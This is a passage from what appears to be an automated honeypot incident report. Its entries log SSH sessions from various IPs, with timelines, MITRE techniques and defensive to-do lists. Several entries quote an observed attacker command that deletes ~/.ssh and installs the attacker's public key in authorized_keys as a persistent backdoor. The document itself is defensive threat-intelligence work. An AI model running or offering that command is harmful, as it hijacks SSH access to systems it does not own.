| **First Seen** | 2026-06-29 15:23 |
| **Last Seen** | 2026-06-29 15:23 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:23:17` | `cowrie.session.connect` |
| `2026-06-29 15:23:20` | `cowrie.client.version` |
| `2026-06-29 15:23:20` | `cowrie.client.kex` |
| `2026-06-29 15:23:25` | `cowrie.login.success` |
| `2026-06-29 15:23:29` | `cowrie.session.params` |
| `2026-06-29 15:23:29` | `cowrie.command.input` |
| `2026-06-29 15:23:31` | `cowrie.log.closed` |
| `2026-06-29 15:23:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72091d3edee7

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-29 15:23 |
| **Last Seen** | 2026-06-29 15:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:23:33` | `cowrie.session.connect` |
| `2026-06-29 15:23:34` | `cowrie.client.version` |
| `2026-06-29 15:23:34` | `cowrie.client.kex` |
| `2026-06-29 15:23:36` | `cowrie.login.success` |
| `2026-06-29 15:23:37` | `cowrie.session.params` |
| `2026-06-29 15:23:37` | `cowrie.command.input` |
| `2026-06-29 15:23:38` | `cowrie.log.closed` |
| `2026-06-29 15:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbfc308e0263

| Field | Detail |
|---|---|
| **Source IP** | `43.156.80[.]135` |
| **First Seen** | 2026-06-29 15:24 |
| **Last Seen** | 2026-06-29 15:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:24:00` | `cowrie.session.connect` |
| `2026-06-29 15:24:00` | `cowrie.client.version` |
| `2026-06-29 15:24:00` | `cowrie.client.kex` |
| `2026-06-29 15:24:01` | `cowrie.login.success` |
| `2026-06-29 15:24:03` | `cowrie.session.params` |
| `2026-06-29 15:24:03` | `cowrie.command.input` |
| `2026-06-29 15:24:03` | `cowrie.command.failed` |
| `2026-06-29 15:24:03` | `cowrie.log.closed` |
| `2026-06-29 15:24:04` | `cowrie.session.params` |
| `2026-06-29 15:24:04` | `cowrie.command.input` |
| `2026-06-29 15:24:04` | `cowrie.session.file_download` |
| `2026-06-29 15:24:04` | `cowrie.log.closed` |
| `2026-06-29 15:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.80[.]135` to AbuseIPDB if not already reported
- [ ] Block `43.156.80[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9c2cf7ebd77

| Field | Detail |
|---|---|
| **Source IP** | `43.156.80[.]135` |
| **First Seen** | 2026-06-29 15:24 |
| **Last Seen** | 2026-06-29 15:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:24:04` | `cowrie.session.connect` |
| `2026-06-29 15:24:04` | `cowrie.client.version` |
| `2026-06-29 15:24:04` | `cowrie.client.kex` |
| `2026-06-29 15:24:05` | `cowrie.login.success` |
| `2026-06-29 15:24:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.80[.]135` to AbuseIPDB if not already reported
- [ ] Block `43.156.80[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b41bbe9745ba

| Field | Detail |
|---|---|
| **Source IP** | `43.156.80[.]135` |
| **First Seen** | 2026-06-29 15:24 |
| **Last Seen** | 2026-06-29 15:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:24:06` | `cowrie.session.connect` |
| `2026-06-29 15:24:06` | `cowrie.client.version` |
| `2026-06-29 15:24:06` | `cowrie.client.kex` |
| `2026-06-29 15:24:07` | `cowrie.login.success` |
| `2026-06-29 15:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.80[.]135` to AbuseIPDB if not already reported
- [ ] Block `43.156.80[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-568ae695dc33

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-06-29 15:26 |
| **Last Seen** | 2026-06-29 15:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:26:13` | `cowrie.session.connect` |
| `2026-06-29 15:26:13` | `cowrie.client.version` |
| `2026-06-29 15:26:13` | `cowrie.client.kex` |
| `2026-06-29 15:26:14` | `cowrie.login.success` |
| `2026-06-29 15:26:15` | `cowrie.session.params` |
| `2026-06-29 15:26:15` | `cowrie.command.input` |
| `2026-06-29 15:26:15` | `cowrie.command.failed` |
| `2026-06-29 15:26:16` | `cowrie.log.closed` |
| `2026-06-29 15:26:16` | `cowrie.session.params` |
| `2026-06-29 15:26:16` | `cowrie.command.input` |
| `2026-06-29 15:26:17` | `cowrie.session.file_download` |
| `2026-06-29 15:26:17` | `cowrie.log.closed` |
| `2026-06-29 15:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3397ad9dab27

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-06-29 15:26 |
| **Last Seen** | 2026-06-29 15:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:26:17` | `cowrie.session.connect` |
| `2026-06-29 15:26:17` | `cowrie.client.version` |
| `2026-06-29 15:26:17` | `cowrie.client.kex` |
| `2026-06-29 15:26:18` | `cowrie.login.success` |
| `2026-06-29 15:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ded5dba56c2

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-06-29 15:26 |
| **Last Seen** | 2026-06-29 15:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:26:19` | `cowrie.session.connect` |
| `2026-06-29 15:26:19` | `cowrie.client.version` |
| `2026-06-29 15:26:19` | `cowrie.client.kex` |
| `2026-06-29 15:26:20` | `cowrie.login.success` |
| `2026-06-29 15:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2ac6e87290c

| Field | Detail |
|---|---|
| **Source IP** | `34.78.74[.]222` |
| **First Seen** | 2026-06-29 15:31 |
| **Last Seen** | 2026-06-29 15:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:31:13` | `cowrie.session.connect` |
| `2026-06-29 15:31:13` | `cowrie.login.success` |
| `2026-06-29 15:31:14` | `cowrie.session.params` |
| `2026-06-29 15:31:14` | `cowrie.command.input` |
| `2026-06-29 15:31:14` | `cowrie.command.input` |
| `2026-06-29 15:31:14` | `cowrie.command.failed` |
| `2026-06-29 15:31:14` | `cowrie.command.input` |
| `2026-06-29 15:31:14` | `cowrie.log.closed` |
| `2026-06-29 15:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.74[.]222` to AbuseIPDB if not already reported
- [ ] Block `34.78.74[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42414caec684

| Field | Detail |
|---|---|
| **Source IP** | `34.78.74[.]222` |
| **First Seen** | 2026-06-29 15:31 |
| **Last Seen** | 2026-06-29 15:31 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:31:27` | `cowrie.session.connect` |
| `2026-06-29 15:31:27` | `cowrie.login.success` |
| `2026-06-29 15:31:27` | `cowrie.session.params` |
| `2026-06-29 15:31:27` | `cowrie.command.input` |
| `2026-06-29 15:31:27` | `cowrie.command.failed` |
| `2026-06-29 15:31:40` | `cowrie.log.closed` |
| `2026-06-29 15:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.74[.]222` to AbuseIPDB if not already reported
- [ ] Block `34.78.74[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f35bd04583d

| Field | Detail |
|---|---|
| **Source IP** | `34.78.74[.]222` |
| **First Seen** | 2026-06-29 15:31 |
| **Last Seen** | 2026-06-29 15:31 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:31:29` | `cowrie.session.connect` |
| `2026-06-29 15:31:29` | `cowrie.login.success` |
| `2026-06-29 15:31:29` | `cowrie.session.params` |
| `2026-06-29 15:31:29` | `cowrie.command.input` |
| `2026-06-29 15:31:40` | `cowrie.log.closed` |
| `2026-06-29 15:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.74[.]222` to AbuseIPDB if not already reported
- [ ] Block `34.78.74[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db23aa412cf1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-29 15:36 |
| **Last Seen** | 2026-06-29 15:36 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:36:10` | `cowrie.session.connect` |
| `2026-06-29 15:36:12` | `cowrie.client.version` |
| `2026-06-29 15:36:12` | `cowrie.client.kex` |
| `2026-06-29 15:36:19` | `cowrie.login.success` |
| `2026-06-29 15:36:22` | `cowrie.session.params` |
| `2026-06-29 15:36:22` | `cowrie.command.input` |
| `2026-06-29 15:36:24` | `cowrie.log.closed` |
| `2026-06-29 15:36:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c904bfe1276e

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-29 15:38 |
| **Last Seen** | 2026-06-29 15:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:38:44` | `cowrie.session.connect` |
| `2026-06-29 15:38:44` | `cowrie.client.version` |
| `2026-06-29 15:38:44` | `cowrie.client.kex` |
| `2026-06-29 15:38:46` | `cowrie.login.success` |
| `2026-06-29 15:38:47` | `cowrie.session.params` |
| `2026-06-29 15:38:47` | `cowrie.command.input` |
| `2026-06-29 15:38:49` | `cowrie.log.closed` |
| `2026-06-29 15:38:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b16eed6c405c

| Field | Detail |
|---|---|
| **Source IP** | `35.195.57[.]110` |
| **First Seen** | 2026-06-29 15:44 |
| **Last Seen** | 2026-06-29 15:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:44:43` | `cowrie.session.connect` |
| `2026-06-29 15:44:43` | `cowrie.client.version` |
| `2026-06-29 15:44:43` | `cowrie.client.kex` |
| `2026-06-29 15:44:45` | `cowrie.login.success` |
| `2026-06-29 15:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.57[.]110` to AbuseIPDB if not already reported
- [ ] Block `35.195.57[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f148deaa7e9d

| Field | Detail |
|---|---|
| **Source IP** | `196.0.242[.]54` |
| **First Seen** | 2026-06-29 15:46 |
| **Last Seen** | 2026-06-29 15:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:46:14` | `cowrie.session.connect` |
| `2026-06-29 15:46:14` | `cowrie.client.version` |
| `2026-06-29 15:46:14` | `cowrie.client.kex` |
| `2026-06-29 15:46:15` | `cowrie.login.success` |
| `2026-06-29 15:46:16` | `cowrie.session.params` |
| `2026-06-29 15:46:16` | `cowrie.command.input` |
| `2026-06-29 15:46:16` | `cowrie.command.failed` |
| `2026-06-29 15:46:17` | `cowrie.log.closed` |
| `2026-06-29 15:46:18` | `cowrie.session.params` |
| `2026-06-29 15:46:18` | `cowrie.command.input` |
| `2026-06-29 15:46:18` | `cowrie.session.file_download` |
| `2026-06-29 15:46:18` | `cowrie.log.closed` |
| `2026-06-29 15:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.0.242[.]54` to AbuseIPDB if not already reported
- [ ] Block `196.0.242[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6f4e7b4392b

| Field | Detail |
|---|---|
| **Source IP** | `196.0.242[.]54` |
| **First Seen** | 2026-06-29 15:46 |
| **Last Seen** | 2026-06-29 15:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:46:18` | `cowrie.session.connect` |
| `2026-06-29 15:46:18` | `cowrie.client.version` |
| `2026-06-29 15:46:18` | `cowrie.client.kex` |
| `2026-06-29 15:46:19` | `cowrie.login.success` |
| `2026-06-29 15:46:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.0.242[.]54` to AbuseIPDB if not already reported
- [ ] Block `196.0.242[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4acaa9e8dde2

| Field | Detail |
|---|---|
| **Source IP** | `196.0.242[.]54` |
| **First Seen** | 2026-06-29 15:46 |
| **Last Seen** | 2026-06-29 15:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:46:20` | `cowrie.session.connect` |
| `2026-06-29 15:46:20` | `cowrie.client.version` |
| `2026-06-29 15:46:20` | `cowrie.client.kex` |
| `2026-06-29 15:46:21` | `cowrie.login.success` |
| `2026-06-29 15:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.0.242[.]54` to AbuseIPDB if not already reported
- [ ] Block `196.0.242[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a62c1699ab0f

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-06-29 15:48 |
| **Last Seen** | 2026-06-29 15:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:48:24` | `cowrie.session.connect` |
| `2026-06-29 15:48:24` | `cowrie.client.version` |
| `2026-06-29 15:48:24` | `cowrie.client.kex` |
| `2026-06-29 15:48:25` | `cowrie.login.success` |
| `2026-06-29 15:48:27` | `cowrie.session.params` |
| `2026-06-29 15:48:27` | `cowrie.command.input` |
| `2026-06-29 15:48:27` | `cowrie.command.failed` |
| `2026-06-29 15:48:27` | `cowrie.log.closed` |
| `2026-06-29 15:48:28` | `cowrie.session.params` |
| `2026-06-29 15:48:28` | `cowrie.command.input` |
| `2026-06-29 15:48:28` | `cowrie.session.file_download` |
| `2026-06-29 15:48:28` | `cowrie.log.closed` |
| `2026-06-29 15:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-999a28209be0

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-06-29 15:48 |
| **Last Seen** | 2026-06-29 15:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:48:29` | `cowrie.session.connect` |
| `2026-06-29 15:48:29` | `cowrie.client.version` |
| `2026-06-29 15:48:29` | `cowrie.client.kex` |
| `2026-06-29 15:48:30` | `cowrie.login.success` |
| `2026-06-29 15:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77f803fa30b0

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-06-29 15:48 |
| **Last Seen** | 2026-06-29 15:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:48:30` | `cowrie.session.connect` |
| `2026-06-29 15:48:30` | `cowrie.client.version` |
| `2026-06-29 15:48:31` | `cowrie.client.kex` |
| `2026-06-29 15:48:32` | `cowrie.login.success` |
| `2026-06-29 15:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c29b5619a4de

| Field | Detail |
|---|---|
| **Source IP** | `200.219.200[.]16` |
| **First Seen** | 2026-06-29 15:48 |
| **Last Seen** | 2026-06-29 15:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:48:36` | `cowrie.session.connect` |
| `2026-06-29 15:48:36` | `cowrie.client.version` |
| `2026-06-29 15:48:36` | `cowrie.client.kex` |
| `2026-06-29 15:48:37` | `cowrie.login.success` |
| `2026-06-29 15:48:37` | `cowrie.session.params` |
| `2026-06-29 15:48:37` | `cowrie.command.input` |
| `2026-06-29 15:48:37` | `cowrie.command.failed` |
| `2026-06-29 15:48:38` | `cowrie.log.closed` |
| `2026-06-29 15:48:38` | `cowrie.session.params` |
| `2026-06-29 15:48:38` | `cowrie.command.input` |
| `2026-06-29 15:48:39` | `cowrie.session.file_download` |
| `2026-06-29 15:48:39` | `cowrie.log.closed` |
| `2026-06-29 15:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.219.200[.]16` to AbuseIPDB if not already reported
- [ ] Block `200.219.200[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2649a9f8698

| Field | Detail |
|---|---|
| **Source IP** | `200.219.200[.]16` |
| **First Seen** | 2026-06-29 15:48 |
| **Last Seen** | 2026-06-29 15:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-29 15:48:39` | `cowrie.session.connect` |
| `2026-06-29 15:48:39` | `cowrie.client.version` |
| `2026-06-29 15:48:39` | `cowrie.client.kex` |
| `2026-06-29 15:48:39` | `cowrie.login.success` |
| `2026-06-29 15:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
